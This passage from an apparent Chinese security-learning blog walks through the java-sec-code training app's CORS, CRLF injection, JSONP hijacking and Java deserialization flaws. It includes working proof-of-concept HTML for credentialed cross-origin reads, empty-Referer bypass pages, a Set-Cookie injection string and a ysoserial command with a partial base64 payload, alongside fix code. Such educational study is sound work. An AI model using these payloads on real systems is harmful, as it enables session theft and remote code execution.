Cors"></a>4. Cors</h2><p>跨域请求伪造，由于限制不严导致可以跨域请求敏感信息，一般结合XSS，CSRF等等漏洞进行攻击。</p><p>前端发起AJAX请求都会受到同源策略（CORS）的限制。发起AJAX请求的方法：</p><ul><li>XMLHttpRequest</li><li>JQuery的<code>$.ajax</code></li><li>Fetch</li></ul><p>前端在发起AJAX请求时，同域或者直接访问的情况下，因为没有跨域的需求，所以Request的Header中的Origin为空。此时，如果后端代码是<code>response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin)</code>，那么Response的header中不会出现<code>Access-Control-Allow-Origin</code>，因为Origin为空。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210901162616408.png" alt="image-20210901162616408"></p><p>在这样配置可以去访问任何服务资源</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure><p>可以用curl来验证</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -i  $&#39;GET&#39; \</span><br><span class="line">    -H $&#39;Origin: http:&#x2F;&#x2F;www.baidu.com&#39; \</span><br><span class="line">    -b $&#39;remember-me&#x3D;YWRtaW46MTYzMTY5MTA4NTA2OTpkZWYwZTFiYjc2MmZhYzFiMzdjMDc2MzNiYjcxOGJkOQ; JSESSIONID&#x3D;2F6ED87C606984C0547455D72FE2B9EE; XSRF-TOKEN&#x3D;1536dc0b-8b8b-4955-b669-c5b9f9b4bd6d&#39; \</span><br><span class="line">    $&#39;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;cors&#x2F;vuln&#x2F;origin&#39;</span><br></pre></td></tr></table></figure><p>Java-sec-code需要cookie来利用无cooike的poc如下</p><p>GET：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line"> &lt;title&gt;CORS TEST&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;div id&#x3D;&#39;output&#39;&gt;&lt;&#x2F;div&gt;</span><br><span class="line"> &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">   var req &#x3D; new XMLHttpRequest(); </span><br><span class="line">   req.onload &#x3D; reqListener; </span><br><span class="line">   req.open(&#39;get&#39;,&#39;http:&#x2F;&#x2F;vuln.com&#x2F;xxxx&#39;,true);</span><br><span class="line">   &#x2F;&#x2F;req.setRequestHeader(&quot;Content-Type&quot;,&quot;application&#x2F;x-www-form-urlencoded;&quot;); </span><br><span class="line">   req.withCredentials &#x3D; true;</span><br><span class="line">   req.send();</span><br><span class="line">   function reqListener() &#123;</span><br><span class="line">    var output &#x3D; document.getElementById(&#39;output&#39;);</span><br><span class="line">    output.innerHTML &#x3D; &quot;URL: http:&#x2F;&#x2F;vuln.com&#x2F;xxxx&lt;br&gt;&lt;br&gt;Response:&lt;br&gt;&lt;textarea style&#x3D;&#39;width: 659px; height: 193px;&#39;&gt;&quot; + req.responseText + &quot;&lt;&#x2F;textarea&gt;&quot;;</span><br><span class="line">   &#125;;</span><br><span class="line"> &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>POST：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CORS TEST&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div id&#x3D;&#39;output&#39;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">            var req &#x3D; new XMLHttpRequest();</span><br><span class="line">            var data &#x3D; &quot;userId%3Dadmin&quot;;</span><br><span class="line">            req.onload &#x3D; reqListener;</span><br><span class="line">            req.open(&#39;post&#39;,&#39;http:&#x2F;&#x2F;vuln.com&#x2F;xxxx&#39;,true);</span><br><span class="line">            req.setRequestHeader(&quot;Content-Type&quot;,&quot;xxx&quot;);</span><br><span class="line">            req.withCredentials &#x3D; true;</span><br><span class="line">            req.send(data);</span><br><span class="line">            function reqListener() &#123;</span><br><span class="line">                var output &#x3D; document.getElementById(&#39;output&#39;);</span><br><span class="line">                output.innerHTML &#x3D; &quot;URL: http:&#x2F;&#x2F;vuln.com&#x2F;xxxx&lt;br&gt;Data: userId%3Dadmin&lt;br&gt;&lt;br&gt;Response:&lt;br&gt;&lt;textarea style&#x3D;&#39;width: 659px; height: 193px;&#39;&gt;&quot; + req.responseText + &quot;&lt;&#x2F;textarea&gt;&quot;;</span><br><span class="line">            &#125;;</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>核心代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static String info &#x3D; &quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;;</span><br><span class="line"></span><br><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;origin&quot;)</span><br><span class="line">public String vuls1(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">    String origin &#x3D; request.getHeader(&quot;origin&quot;);</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin); &#x2F;&#x2F; set origin from header</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);  &#x2F;&#x2F; allow cookie</span><br><span class="line">    return info;</span><br><span class="line">&#125;</span><br><span class="line">@GetMapping(&quot;&#x2F;vuln&#x2F;setHeader&quot;)</span><br><span class="line">public String vuls2(HttpServletResponse response) &#123;</span><br><span class="line">    &#x2F;&#x2F; 后端设置Access-Control-Allow-Origin为*的情况下，跨域的时候前端如果设置withCredentials为true会异常</span><br><span class="line">    response.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);</span><br><span class="line">    return info;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置HTTP头，然后直接返回信息</p><p>修复方式如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">     * 重写Cors的checkOrigin校验方法</span><br><span class="line">     * 支持自定义checkOrigin，让其额外支持一级域名</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;security&#x2F;CustomCorsProcessor</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @CrossOrigin(origins &#x3D; &#123;&quot;joychou.org&quot;, &quot;http:&#x2F;&#x2F;test.joychou.me&quot;&#125;)</span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;crossOrigin&quot;)</span><br><span class="line">    public String secCrossOrigin() &#123;</span><br><span class="line">        return info;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * WebMvcConfigurer设置Cors</span><br><span class="line">     * 支持自定义checkOrigin</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;config&#x2F;CorsConfig.java</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;webMvcConfigurer&quot;)</span><br><span class="line">    public CsrfToken getCsrfToken_01(CsrfToken token) &#123;</span><br><span class="line">        return token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * spring security设置cors</span><br><span class="line">     * 不支持自定义checkOrigin，因为spring security优先于setCorsProcessor执行</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;security&#x2F;WebSecurityConfig.java</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;httpCors&quot;)</span><br><span class="line">    public CsrfToken getCsrfToken_02(CsrfToken token) &#123;</span><br><span class="line">        return token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 自定义filter设置cors</span><br><span class="line">     * 支持自定义checkOrigin</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;filter&#x2F;OriginFilter.java</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;originFilter&quot;)</span><br><span class="line">    public CsrfToken getCsrfToken_03(CsrfToken token) &#123;</span><br><span class="line">        return token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * CorsFilter设置cors。</span><br><span class="line">     * 不支持自定义checkOrigin，因为corsFilter优先于setCorsProcessor执行</span><br><span class="line">     * 代码：org&#x2F;joychou&#x2F;filter&#x2F;BaseCorsFilter.java</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @RequestMapping(&quot;&#x2F;sec&#x2F;corsFilter&quot;)</span><br><span class="line">    public CsrfToken getCsrfToken_04(CsrfToken token) &#123;</span><br><span class="line">        return token;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    @GetMapping(&quot;&#x2F;sec&#x2F;checkOrigin&quot;)</span><br><span class="line">    public String seccode(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">        String origin &#x3D; request.getHeader(&quot;Origin&quot;);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; 如果origin不为空并且origin不在白名单内，认定为不安全。</span><br><span class="line">        &#x2F;&#x2F; 如果origin为空，表示是同域过来的请求或者浏览器直接发起的请求。</span><br><span class="line">        if (origin !&#x3D; null &amp;&amp; SecurityUtil.checkURL(origin) &#x3D;&#x3D; null) &#123;</span><br><span class="line">            return &quot;Origin is not safe.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Origin&quot;, origin);</span><br><span class="line">        response.setHeader(&quot;Access-Control-Allow-Credentials&quot;, &quot;true&quot;);</span><br><span class="line">        return LoginUtils.getUserInfo2JsonStr(request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.mi1k7ea.com/2019/08/18/CORS%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#CORS%E4%B8%8ECSRF%E7%9A%84%E5%8C%BA%E5%88%AB">Cors和CSRF的区别</a></p><h2 id="5-CRLFInjection"><a href="#5-CRLFInjection" class="headerlink" title="5.CRLFInjection"></a>5.CRLFInjection</h2><p>​    CRLF是”回车+换行”(\r\n)(编码后是%0D%0A)的简称,在HTTP中,HTTP Header和HTTP Body是用两个CRLF来分割的。浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。CRLF漏洞可以造成Cookie会话固定和反射型XSS(可过waf)的危害，注入XSS的利用方式：连续使用两次%0d%oa就会造成header和body之间的分离，就可以在其中插入xss代码形成反射型xss漏洞。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;http:&#x2F;&#x2F;baidu.com&#x2F;xxx%0a%0dSet-Cookie: test123&#x3D;123  &#x2F;&#x2F; 恶意添加修改信息</span><br></pre></td></tr></table></figure><p>​    关于实战，这里有几个案例，可以学习一波。</p><ol><li><a href="https://www.v0n.top/2020/01/29/CRLF注入/">CRLF注入</a></li><li><a href="https://www.leavesongs.com/PENETRATION/bottle-crlf-cve-2016-9964.html">Bottle HTTP 头注入漏洞探究</a></li><li><a href="https://www.cnblogs.com/tr1ple/p/6648767.html">案例</a></li></ol><p>但这个问题实际上已经在所有的现在的java EE应用服务器上修复了。如果你想关注这个漏洞，你应该在目标平台测试是否允许将CRLF插入到HTTP头中。不出意外的话，这个漏洞已经在大部分的目前的应用服务器上修复了，无论是用什么语言编写的。</p><p>核心代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(&quot;&#x2F;crlf&quot;)</span><br><span class="line">public class CRLFInjection &#123;</span><br><span class="line"></span><br><span class="line">    @RequestMapping(&quot;&#x2F;safecode&quot;)</span><br><span class="line">    @ResponseBody</span><br><span class="line">    public void crlf(HttpServletRequest request, HttpServletResponse response) &#123;</span><br><span class="line">        response.addHeader(&quot;test1&quot;, request.getParameter(&quot;test1&quot;));</span><br><span class="line">        response.setHeader(&quot;test2&quot;, request.getParameter(&quot;test2&quot;));</span><br><span class="line">        String author &#x3D; request.getParameter(&quot;test3&quot;);</span><br><span class="line">        Cookie cookie &#x3D; new Cookie(&quot;test3&quot;, author);</span><br><span class="line">        response.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问<a href="http://localhost:8080/java_sec_code_war/crlf/safecode">http://localhost:8080/java_sec_code_war/crlf/safecode</a></p><p>?test1=111%0d%0ax&amp;test2=111%0d%0a111</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909095847712.png" alt="image-20210909095847712"></p><h2 id="6-Jsonp"><a href="#6-Jsonp" class="headerlink" title="6.Jsonp"></a>6.Jsonp</h2><p>JSONP是实现跨域的一种技术，应用于Web站点需要跨域获取数据的场景。当开发者使用不当时，攻击者可以恶意利用jsonp劫持数据。</p><p>举例说明如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">在 jQuery 中，可以通过使用JSONP 形式的回调函数来加载其他网域的JSON数据，如 &quot;myurl?callback&#x3D;?&quot;。jQuery 将自动替换 ? 为正确的函数名，以执行回调函数。 </span><br><span class="line">jQuery 会把？注册成window.? 的系统函数，然后映射调用。</span><br><span class="line">一般用于跨域ajax请求，提供URL的一方会返回一个callback函数的JSON数据，然后回调时就能获取了。</span><br><span class="line"> </span><br><span class="line">请求的URL例子：</span><br><span class="line">&quot;myurl?callback&#x3D;123123123&quot; &#x2F;&#x2F;这个123123就是?号，jquery自动生成的。</span><br><span class="line">返回的数据例子：</span><br><span class="line">123123123(&#123;“id”:&quot;1&quot;,&quot;name&quot;:&quot;张三&quot;&#125;)</span><br></pre></td></tr></table></figure><p>核心代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@ControllerAdvice</span><br><span class="line">public class JSONPAdvice extends AbstractJsonpResponseBodyAdvice &#123;</span><br><span class="line"></span><br><span class="line">    public JSONPAdvice() &#123;</span><br><span class="line">        super(&quot;callback&quot;, &quot;cback&quot;); &#x2F;&#x2F; callback的参数名，可以为多个</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当有接口返回了Object(比如JSONObject或者JavaBean，但是不支持String)，只要在参数中加入<code>callback=test</code>或<code>cback=test</code>就会自动变成JSONP接口。比如下面代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;advice&quot;, produces &#x3D; MediaType.APPLICATION_JSON_VALUE)</span><br><span class="line">public JSONObject advice() &#123;</span><br><span class="line">    String info &#x3D; &quot;&#123;\&quot;name\&quot;: \&quot;JoyChou\&quot;, \&quot;phone\&quot;: \&quot;18200001111\&quot;&#125;&quot;;</span><br><span class="line">    return JSON.parseObject(info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然上面代码指定了response的<code>content-type</code>为<code>application/json</code>，但是在<code>AbstractJsonpResponseBodyAdvice</code>类中会设置为<code>application/javascript</code>，提供给前端调用。</p><p>设置<code>content-type</code>为<code>application/javascript</code>的代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected MediaType getContentType(MediaType contentType, ServerHttpRequest request, ServerHttpResponse response) &#123;</span><br><span class="line">return new MediaType(&quot;application&quot;, &quot;javascript&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且还会判断callback的参数只是否是有效的，代码如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">private static final Pattern CALLBACK_PARAM_PATTERN &#x3D; Pattern.compile(&quot;[0-9A-Za-z_\\.]*&quot;);</span><br><span class="line"></span><br><span class="line">protected boolean isValidJsonpQueryParam(String value) &#123;</span><br><span class="line">return CALLBACK_PARAM_PATTERN.matcher(value).matches();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="安全问题："><a href="#安全问题：" class="headerlink" title="安全问题："></a>安全问题：</h3><blockquote><p>使用<code>AbstractJsonpResponseBodyAdvice</code>能避免callback导致的XSS问题，但是会带来一个新的风险：可能有的JSON接口强行被设置为了JSONP，导致JSON劫持。所以使用<code>AbstractJsonpResponseBodyAdvice</code>，需要默认校验所有jsonp接口的referer是否合法。</p></blockquote><p>PS：</p><p>在Spring Framework 5.1，移除了<code>AbstractJsonpResponseBodyAdvice</code>类。Springboot <code>2.1.0 RELEASE</code>默认使用spring framework版本5.1.2版本。也就是在SpringBoot <code>2.1.0 RELEASE</code>及以后版本都不能使用该功能，用CORS替代。</p><p><a href="https://docs.spring.io/spring/docs/5.0.x/javadoc-api/org/springframework/web/servlet/mvc/method/annotation/AbstractJsonpResponseBodyAdvice.html">https://docs.spring.io/spring/docs/5.0.x/javadoc-api/org/springframework/web/servlet/mvc/method/annotation/AbstractJsonpResponseBodyAdvice.html</a></p><blockquote><p>Will be removed as of Spring Framework 5.1, use CORS instead.</p></blockquote><h3 id="1-前端调用代码的"><a href="#1-前端调用代码的" class="headerlink" title="1.前端调用代码的"></a>1.前端调用代码的</h3><ul><li>使用ajax的jsonp调用方式，运行后会弹框<code>JoyChou</code>。</li><li>使用script src方式，运行后会弹框<code>JoyChou</code>。</li></ul><p>使用ajax的jsonp调用方式代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;UTF-8&quot; &#x2F;&gt;</span><br><span class="line">&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdn.bootcss.com&#x2F;jquery&#x2F;3.4.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script language&#x3D;&quot;JavaScript&quot;&gt;</span><br><span class="line">$(document).ready(function() &#123;</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">url:&#39;http:&#x2F;&#x2F;localhost:8080&#x2F;jsonp&#x2F;advice&#39;,</span><br><span class="line">dataType:&#39;jsonp&#39;,</span><br><span class="line">success:function(data)&#123;</span><br><span class="line">alert(data.name)</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>script src方式代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">function aaa(data)&#123;</span><br><span class="line">alert(JSON.stringify(data));</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;jsonp&#x2F;vuln&#x2F;referer?callback_&#x3D;aaa&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>script src方法 测试如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909105509839.png" alt="image-20210909105509839"></p><h3 id="2-空Referer绕过"><a href="#2-空Referer绕过" class="headerlink" title="2.空Referer绕过"></a>2.空Referer绕过</h3><p>有时候开发同学为了测试方便，JSONP接口能直接访问，不直接访问做了Referer限制。正常来讲，前端发起的请求默认都会带着Referer，所以简单说下如何绕过空Referer。</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;vuln&#x2F;emptyReferer&quot;, produces &#x3D; &quot;application&#x2F;javascript&quot;)</span><br><span class="line">public String emptyReferer(HttpServletRequest request) &#123;</span><br><span class="line">    String referer &#x3D; request.getHeader(&quot;referer&quot;);</span><br><span class="line"></span><br><span class="line">    if (null !&#x3D; referer &amp;&amp; SecurityUtil.checkURL(referer) &#x3D;&#x3D; null) &#123;</span><br><span class="line">        return &quot;error&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String callback &#x3D; request.getParameter(this.callback);</span><br><span class="line">    return WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>增加了对referer的检测我们可以使用如下方法进行绕过</p><h4 id="1-添加no-referrer-参数"><a href="#1-添加no-referrer-参数" class="headerlink" title="1.添加no-referrer 参数"></a>1.添加no-referrer 参数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;referrer&quot; content&#x3D;&quot;no-referrer&quot; &#x2F;&gt;      &#x2F;&#x2F;no-referrer</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function test(data)&#123;</span><br><span class="line">alert(JSON.stringify(data));</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script src&#x3D;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;jsonp&#x2F;vuln&#x2F;emptyReferer?callback_&#x3D;test&gt;&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h4 id="2-使用iframe标签进行绕过"><a href="#2-使用iframe标签进行绕过" class="headerlink" title="2.使用iframe标签进行绕过"></a>2.使用iframe标签进行绕过</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;referrer&quot; content&#x3D;&quot;no-referrer&quot; &#x2F;&gt;</span><br><span class="line">&lt;iframe src&#x3D;&quot;javascript:&#39;&lt;script&gt;function test(data)&#123;alert(JSON.stringify(data));&#125;&lt;&#x2F;script&gt;&lt;script src&#x3D;http:&#x2F;&#x2F;172.20.10.6:8080&#x2F;java_sec_code_war&#x2F;jsonp&#x2F;vuln&#x2F;emptyReferer?callback_&#x3D;test&gt;&lt;&#x2F;script&gt;&#39;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p>测试如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909111157468.png" alt="image-20210909111157468"></p><p>修复代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@RequestMapping(value &#x3D; &quot;&#x2F;sec&#x2F;checkReferer&quot;, produces &#x3D; &quot;application&#x2F;javascript&quot;)</span><br><span class="line">public String safecode(HttpServletRequest request) &#123;</span><br><span class="line">    String referer &#x3D; request.getHeader(&quot;referer&quot;);</span><br><span class="line"></span><br><span class="line">    if (SecurityUtil.checkURL(referer) &#x3D;&#x3D; null) &#123;</span><br><span class="line">        return &quot;error&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    String callback &#x3D; request.getParameter(this.callback);</span><br><span class="line">    return WebUtils.json2Jsonp(callback, LoginUtils.getUserInfo2JsonStr(request));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不管referer是否为null都进行判断</p><h3 id="3-fastjsonp-to-jsonp"><a href="#3-fastjsonp-to-jsonp" class="headerlink" title="3.fastjsonp to jsonp"></a>3.fastjsonp to jsonp</h3><p>核心代码如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@GetMapping(value &#x3D; &quot;&#x2F;fastjsonp&#x2F;getToken&quot;, produces &#x3D; &quot;application&#x2F;javascript&quot;)</span><br><span class="line">public String getCsrfToken2(HttpServletRequest request) &#123;</span><br><span class="line">    CsrfToken csrfToken &#x3D; cookieCsrfTokenRepository.loadToken(request); &#x2F;&#x2F; get csrf token</span><br><span class="line"></span><br><span class="line">    String callback &#x3D; request.getParameter(&quot;fastjsonpCallback&quot;);</span><br><span class="line">    if (StringUtils.isNotBlank(callback)) &#123;</span><br><span class="line">        JSONPObject jsonpObj &#x3D; new JSONPObject(callback);</span><br><span class="line">        jsonpObj.addParameter(csrfToken);</span><br><span class="line">        return jsonpObj.toString();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        return csrfToken.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试如下：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210909143444477.png" alt="image-20210909143444477"></p><h2 id="7-Deserialize-序列化与反序列化"><a href="#7-Deserialize-序列化与反序列化" class="headerlink" title="7.Deserialize 序列化与反序列化"></a>7.Deserialize 序列化与反序列化</h2><p>​    Java程序使用ObjectInputStream对象的readObject方法将反序列化数据转换为java对象。但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p><p>核心代码：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line">     * java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64</span><br><span class="line">     * Add the result to rememberMe cookie.</span><br><span class="line">     * &lt;p&gt;</span><br><span class="line">     * http:&#x2F;&#x2F;localhost:8080&#x2F;deserialize&#x2F;rememberMe&#x2F;vuln</span><br><span class="line">     *&#x2F;</span><br><span class="line">    @RequestMapping(&quot;&#x2F;rememberMe&#x2F;vuln&quot;)</span><br><span class="line">    public String rememberMeVul(HttpServletRequest request)</span><br><span class="line">            throws IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        Cookie cookie &#x3D; getCookie(request, Constants.REMEMBER_ME_COOKIE);</span><br><span class="line"></span><br><span class="line">        if (null &#x3D;&#x3D; cookie) &#123;</span><br><span class="line">            return &quot;No rememberMe cookie. Right?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String rememberMe &#x3D; cookie.getValue();</span><br><span class="line">        byte[] decoded &#x3D; Base64.getDecoder().decode(rememberMe);</span><br><span class="line"></span><br><span class="line">        ByteArrayInputStream bytes &#x3D; new ByteArrayInputStream(decoded);</span><br><span class="line">        ObjectInputStream in &#x3D; new ObjectInputStream(bytes);</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">        return &quot;Are u ok?&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>代码相对来说也比较简单使用Java程序中类ObjectInputStream的readObject方法被用来将数据流反序列化为对象，如果流中的对象是class，则它的ObjectStreamClass描述符会被读取，并返回相应的class对象，ObjectStreamClass包含了类的名称及serialVersionUID。</p><p>利用方式如下：</p><p>使用ysoserial.jar生成payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64</span><br><span class="line">rO0ABXNyAC5qYXZheC5tYW5hZ2VtZW50LkJhZEF0dHJpYnV0ZVZhbHVlRXhwRXhjZXB0aW9u1Ofaq2MtRkACAAFMAAN2YWx0ABJMamF2YS9sYW5nL09iamVjdDt4cgATamF2YS5sYW5nLkV4Y2VwdGlvbtD9Hz4aOxzEAgAAeHIAE2phdmEubGFuZy5UaHJvd2FibGXVxjUnOXe4ywMABEwABWNhdXNldAAVTGphdmEvbGFuZy9UaHJvd2FibGU7TAANZGV0YWlsTWVzc2FnZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sACnN0YWNrVHJhY2V0AB5bTGphdmEvbGFuZy9TdGFja1RyYWNlRWxlbWVudDtMABRzdXBwcmVzc2VkRXhjZXB0aW9uc3QAEExqYXZhL3V0aWwvTGlzdDt4cHEAfgAIcHVyAB5bTGphdmEubGFuZy5TdGFja1RyYWNlRWxlbWVudDsCRio8PP0iOQIAAHhwAAAAA3NyABtqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnRhCcWaJjbdhQIABEkACmxpbmVOdW1iZXJMAA5kZWNsYXJpbmdDbGFzc3EAfgAFTAAIZmlsZU5hbWVxAH4ABUwACm1ldGhvZE5hbWVxAH4ABXhwAAAAUXQAJnlzb3NlcmlhbC5wYXlsb2Fkcy5Db21tb25zQ29sbGVjdGlvbnM1dAAYQ29tbW9uc0NvbGxlY3Rpb25zNS5qYXZhdAAJZ2V0T2JqZWN0c3EAfgALAAAAM3EAfgANcQB+AA5xAH4AD3NxAH4ACwAAACJ0ABl5c29zZXJpYWwuR2VuZXJhdGVQYXlsb2FkdAAUR2VuZXJhdGVQYXlsb2FkLmphdmF0AARtYWluc3IAJmphdmEudXRpbC5Db2xsZWN0aW9ucyRVbm1vZGlmaWFibGVMaXN0&#x2F;A8lMbXsjhACAAFMAARsaXN0cQB+AAd4cgAsamF2YS51dGlsLkNvbGxlY3Rpb25zJFVubW9kaWZpYWJs